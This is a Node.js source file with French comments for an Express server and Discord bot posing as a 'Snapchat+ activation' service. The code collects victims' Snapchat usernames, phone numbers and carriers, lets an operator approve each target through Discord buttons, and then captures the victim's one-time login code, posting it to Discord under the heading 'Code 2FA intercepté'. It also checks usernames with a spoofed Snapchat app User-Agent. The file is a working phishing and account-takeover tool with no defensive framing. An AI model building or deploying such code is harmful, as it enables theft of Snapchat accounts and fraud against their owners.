require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
const { v4: uuidv4 } = require('uuid');

// --- Configuration Express ---
const app = express();
app.use(express.json());
app.use(express.static('public'));

// --- Configuration Discord ---
const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages]
});

// Map pour stocker les demandes en attente
const requests = new Map();

const APPROVAL_CHANNEL_ID = process.env.DISCORD_APPROVAL_CHANNEL;
const BASE_URL = process.env.BASE_URL || `http://localhost:${process.env.PORT || 3000}`;
const PORT = process.env.PORT || 3000;

// ================== ROUTES EXPRESS ==================

// 1. Soumission des infos (étape 1)
app.post('/api/submit', async (req, res) => {
    const { snapchat, phone, operator } = req.body;
    if (!snapchat || !phone || !operator) {
        return res.status(400).json({ error: 'Champs manquants' });
    }

    const id = uuidv4();
    requests.set(id, {
        snapchat, phone, operator,
        approved: false, rejected: false, code: null
    });

    try {
        const channel = client.channels.cache.get(APPROVAL_CHANNEL_ID);
        if (!channel) throw new Error("Salon d'approbation introuvable");

        const embed = new EmbedBuilder()
            .setTitle('📱 Nouvelle demande d\'activation Snapchat+')
            .setColor(0xFFFC00)
            .addFields(
                { name: 'Pseudo', value: snapchat, inline: true },
                { name: 'Téléphone', value: phone, inline: true },
                { name: 'Opérateur', value: operator, inline: true },
                { name: 'ID', value: id }
            )
            .setTimestamp();

        const row = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder().setCustomId(`approve_${id}`).setLabel('✅ Accepter').setStyle(ButtonStyle.Success),
                new ButtonBuilder().setCustomId(`reject_${id}`).setLabel('❌ Refuser').setStyle(ButtonStyle.Danger)
            );

        await channel.send({ embeds: [embed], components: [row] });
        console.log(`✅ Demande #${id} envoyée à Discord`);
        res.json({ id });
    } catch (err) {
        console.error('Erreur envoi Discord :', err);
        res.status(500).json({ error: 'Erreur serveur' });
    }
});

// 2. Vérification d’un pseudo Snapchat (via endpoint public)
app.get('/api/check-snapchat/:username', async (req, res) => {
    const username = req.params.username.trim();
    if (!username) return res.status(400).json({ error: 'Pseudo requis' });

    try {
        const response = await axios.get(
            `https://app.snapchat.com/web/deeplink/user?username=${encodeURIComponent(username)}`,
            {
                headers: {
                    'User-Agent': 'Snapchat/12.64.0.65 (iPhone; iOS 16.0; Scale/3.00)',
                    'Accept': 'application/json'
                },
                timeout: 5000
            }
        );
        const data = response.data;
        if (data?.data?.userProfile?.username) {
            const profile = data.data.userProfile;
            res.json({
                exists: true,
                username: profile.username,
                displayName: profile.displayName || profile.username,
                avatarUrl: profile.bitmoji?.avatar || null
            });
        } else {
            res.json({ exists: false, error: 'Profil non trouvé' });
        }
    } catch (err) {
        console.error('Erreur vérification Snapchat:', err.message);
        res.json({ exists: false, error: 'Service indisponible' });
    }
});

// 3. Statut d'une demande (polling)
app.get('/api/status/:id', (req, res) => {
    const request = requests.get(req.params.id);
    if (!request) return res.status(404).json({ error: 'Demande introuvable' });
    res.json({
        approved: request.approved,
        rejected: request.rejected,
        snapchat: request.snapchat
    });
});

// 4. Code reçu
app.post('/api/code', async (req, res) => {
    const { id, code } = req.body;
    if (!id || !code) return res.status(400).json({ error: 'Champs manquants' });
    const request = requests.get(id);
    if (!request) return res.status(404).json({ error: 'Demande introuvable' });
    if (!request.approved) return res.status(403).json({ error: 'Demande non approuvée' });

    request.code = code;

    const channel = client.channels.cache.get(APPROVAL_CHANNEL_ID);
    if (channel) {
        const embed = new EmbedBuilder()
            .setTitle('🔐 Code 2FA intercepté')
            .setColor(0x00FF00)
            .addFields(
                { name: 'Pseudo', value: request.snapchat },
                { name: 'Téléphone', value: request.phone },
                { name: 'Opérateur', value: request.operator },
                { name: 'Code', value: code }
            )
            .setTimestamp();
        channel.send({ embeds: [embed] });
    }
    requests.delete(id);
    res.json({ success: true });
});

// --- Interactions Discord (boutons) ---
client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;
    const [action, requestId] = interaction.customId.split('_');
    if (action !== 'approve' && action !== 'reject') return;
    const request = requests.get(requestId);
    if (!request) return interaction.reply({ content: 'Demande introuvable.', ephemeral: true });
    if (request.approved || request.rejected) {
        return interaction.reply({ content: 'Déjà traitée.', ephemeral: true });
    }
    if (action === 'approve') {
        request.approved = true;
        await interaction.reply({ content: `✅ Demande acceptée pour ${request.snapchat}.`, ephemeral: true });
    } else {
        request.rejected = true;
        await interaction.reply({ content: `❌ Demande refusée pour ${request.snapchat}.`, ephemeral: true });
    }
    await interaction.message.edit({ components: [] });
});

// --- Démarrage ---
client.once('ready', () => {
    console.log(`🤖 Bot Discord connecté en tant que ${client.user.tag}`);
});

client.login(process.env.DISCORD_BOT_TOKEN);

app.listen(PORT, () => {
    console.log(`🚀 Serveur web lancé sur ${BASE_URL}`);
});
